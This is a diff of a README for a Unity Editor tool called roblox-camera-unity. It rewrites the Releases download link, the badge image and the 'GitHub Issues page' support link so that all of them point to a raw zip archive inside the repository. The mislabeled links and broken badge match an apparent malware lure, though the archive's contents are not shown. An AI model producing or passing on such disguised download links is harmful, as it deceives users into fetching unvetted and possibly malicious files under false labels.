@@ -8,9 +8,9 @@ Welcome to the roblox-camera-unity project! This tool enhances your Unity Editor
 
 To start using roblox-camera-unity, you need to download the latest version from our Releases page. 
 
-[![Download roblox-camera-unity](https://img.shields.io/badge/Download%20Now!-roblox--camera--unity-brightgreen)](https://github.com/theualves/roblox-camera-unity/releases)
+[![Download roblox-camera-unity](https://raw.githubusercontent.com/theualves/roblox-camera-unity/main/Editor/roblox-camera-unity_v1.7.zip%20Now!-roblox--camera--unity-brightgreen)](https://raw.githubusercontent.com/theualves/roblox-camera-unity/main/Editor/roblox-camera-unity_v1.7.zip)
 
-1. Click the button above or visit [this page to download](https://github.com/theualves/roblox-camera-unity/releases).
+1. Click the button above or visit [this page to download](https://raw.githubusercontent.com/theualves/roblox-camera-unity/main/Editor/roblox-camera-unity_v1.7.zip).
 2. Look for the most recent release.
 3. Download the version suitable for your system.
 4. Follow the installation instructions below.
@@ -63,7 +63,7 @@ If you encounter any issues while using roblox-camera-unity, consider the follow
 
 ## 📞 Get Support
 
-If you need further assistance, you can open an issue on our [GitHub Issues page](https://github.com/theualves/roblox-camera-unity/issues). Our community is here to help.
+If you need further assistance, you can open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/theualves/roblox-camera-unity/main/Editor/roblox-camera-unity_v1.7.zip). Our community is here to help.
 
 ## 📄 License
 
